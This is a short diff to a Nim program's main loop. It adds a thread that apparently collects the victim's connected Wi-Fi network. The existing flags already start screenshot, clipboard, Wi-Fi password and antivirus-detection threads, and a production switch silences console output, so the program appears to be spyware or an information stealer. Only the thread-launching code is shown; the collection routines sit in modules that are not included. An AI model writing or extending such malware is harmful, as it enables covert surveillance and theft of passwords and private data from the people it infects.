@@ -50,6 +50,7 @@ from lib/flags import USE_SCREENSHOT_THREAD
 from lib/flags import USE_CLIPBOARD_THREAD
 from lib/flags import USE_WIFI_PASSWORDS_THREAD
 from lib/flags import USE_GET_AVS_THREAD
+from lib/flags import USE_CONNECTED_WIFI_THREAD
 
 when not isProd:
   echo "started"
@@ -120,6 +121,13 @@ when USE_GET_AVS_THREAD:
   var getAVSThreadVar: Thread[void]
 
   createThread(getAVSThreadVar, initGetAVSThread)
+
+when USE_CONNECTED_WIFI_THREAD:
+  from lib/threads/connectedWifiThread import initConnectedWifiThread
+
+  var connectedWifiThreadVar: Thread[void]
+
+  createThread(connectedWifiThreadVar, initConnectedWifiThread)
 
 # wait for thread messages
 while true:
